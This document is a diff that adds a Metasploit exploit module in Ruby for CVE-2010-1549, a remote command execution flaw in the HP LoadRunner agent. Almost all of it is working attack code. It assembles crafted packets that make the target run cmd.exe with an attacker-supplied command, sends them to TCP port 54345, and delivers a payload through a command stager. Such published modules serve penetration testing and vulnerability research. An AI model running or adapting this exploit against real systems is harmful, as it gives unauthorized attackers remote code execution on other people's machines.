@@ -1,0 +1,99 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::CmdStager
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "HP Mercury LoadRunner Agent magentproc.exe Remote Command Execution",
+      'Description'    => %q{
+        This module exploits a remote command execution vulnerablity in HP LoadRunner before 9.50
+        and also HP Performance Center before 9.50. HP LoadRunner 12.53 and other versions are
+        also most likely vulneable if the (non-default) SSL option is turned off.
+        By sending a specially crafted packet, an attacker can execute commands remotely.
+        The service is vulnerable provided the Secure Channel feature is disabled (default).
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Unknown', # Original discovery # From Tenable Network Security
+          'aushack'  # metasploit module
+        ],
+      'References'     =>
+        [
+          ['CVE', '2010-1549'],
+          ['ZDI', '10-080'],
+          ['BID', '39965'],
+          ['URL', 'https://support.hpe.com/hpsc/doc/public/display?docId=c00912968']
+        ],
+      'Payload'        => { 'BadChars' => "\x0d\x0a\x00" },
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+          # Note: software reportedly supports Linux - may also be vulnerable.
+          ['Windows (Dropper)',
+          'Platform'   => 'win',
+          'Arch'       => [ARCH_X86, ARCH_X64]
+          ],
+        ],
+      'Privileged'     => false,
+      'Stance'         => Msf::Exploit::Stance::Aggressive,
+      'DisclosureDate' => 'May 06 2010',
+      'DefaultTarget'  => 0))
+
+      register_options([Opt::RPORT(54345)])
+  end
+
+  def autofilter
+    true
+  end
+
+  def execute_command(cmd, _opts = {})
+    guid = Rex::Text.encode_base64(Rex::Text.rand_text_alphanumeric(17))
+    randstr = Rex::Text.rand_text_alpha(16)
+    server_name = Rex::Text.rand_text_alpha(7)
+    server_ip = datastore['LHOST']
+    server_port = Rex::Text.rand_text_numeric(4)
+    # If linux is one day supported, cmd1 = /bin/sh and cmd2 = -c cmd
+    cmd1 = "C:\\Windows\\system32\\cmd.exe"
+    cmd2 = "/C \"#{cmd}\""
+
+    pkt1 = [0x19].pack('N') + guid + '0'
+
+    pkt2 = [0x6].pack('N') + [0x0].pack('N') + "(-server_type=8)(-server_name=#{server_name})(-server_full_name=#{server_name})"
+    pkt2 << "(-server_ip_name=#{server_ip})(-server_port=#{server_port})(-server_fd_secondary=4)(-guid_identifier=#{guid})\x00\x00"
+    pkt2 << [0x7530].pack('N')
+
+    pkt3 = [4 + pkt2.length].pack('N') + pkt2
+
+    pkt4 = [0x1c].pack('N') + [0x05].pack('N') + [0x01].pack('N') + randstr + pkt3
+
+    pkt5 = [pkt4.length].pack('N') + pkt4
+
+    pkt6 = [0x437].pack('N') + [0x0].pack('N') + [0x31].pack('N') + [1].pack('N') + [0x31000000].pack('N')
+    pkt6 << [cmd1.length].pack('N') + cmd1 + "\x00" + [cmd2.length].pack('N') + cmd2 + [0x0].pack('N') + [0x0].pack('N')
+
+    pkt7 = [4 + pkt6.length].pack('N') + pkt6
+
+    pkt8 = [0x18].pack('N') + [0x04].pack('N') + randstr + pkt7
+
+    pkt9 = [pkt8.length].pack('N') + pkt8
+
+    sploit = pkt1 + pkt5 + pkt9
+
+    connect
+    sock.put(sploit)
+    disconnect
+ end
+
+  def exploit
+      print_status('Sending payload...')
+      execute_cmdstager(linemax: 1500)
+  end
+end
